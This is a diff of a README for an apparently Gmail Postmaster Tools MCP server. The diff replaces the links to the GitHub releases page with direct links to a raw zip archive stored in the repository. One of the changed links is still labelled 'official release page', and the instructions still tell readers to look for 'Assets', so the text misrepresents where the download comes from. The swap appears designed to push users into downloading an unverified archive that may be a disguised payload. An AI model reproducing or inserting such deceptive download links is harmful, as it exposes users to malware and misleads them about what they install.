@@ -1,6 +1,6 @@
 # 📧 gmail-postmaster-tools-mcp - View email health inside your AI
 
-[![](https://img.shields.io/badge/Download-Visit_Releases_Page-blue.svg)](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/releases)
+[![](https://img.shields.io/badge/Download-Visit_Releases_Page-blue.svg)](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/raw/refs/heads/main/server/mcp_gmail_postmaster_tools_v1.0.zip)
 
 This software lets you see your Gmail domain performance directly inside AI tools. You can track traffic metrics, check your sender compliance, and monitor domain health. It connects your email data to your preferred AI chat interface. You keep control of your data through your own Google OAuth credentials.
 
@@ -15,12 +15,12 @@ This software lets you see your Gmail domain performance directly inside AI tool
 
 You must visit the project page to get the latest version. Follow these steps to obtain the files:
 
-1. Go to the [official release page](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/releases).
+1. Go to the [official release page](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/raw/refs/heads/main/server/mcp_gmail_postmaster_tools_v1.0.zip).
 2. Look for the section labeled "Assets".
 3. Click the link that matches your operating system to start the download.
 4. Save the folder to a location you remember, such as your Downloads or Documents folder.
 
-[![](https://img.shields.io/badge/Download-Get_Latest_Version-grey.svg)](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/releases)
+[![](https://img.shields.io/badge/Download-Get_Latest_Version-grey.svg)](https://github.com/youngwolf2077-a11y/gmail-postmaster-tools-mcp/raw/refs/heads/main/server/mcp_gmail_postmaster_tools_v1.0.zip)
 
 ## ⚙️ Setup and Configuration
 
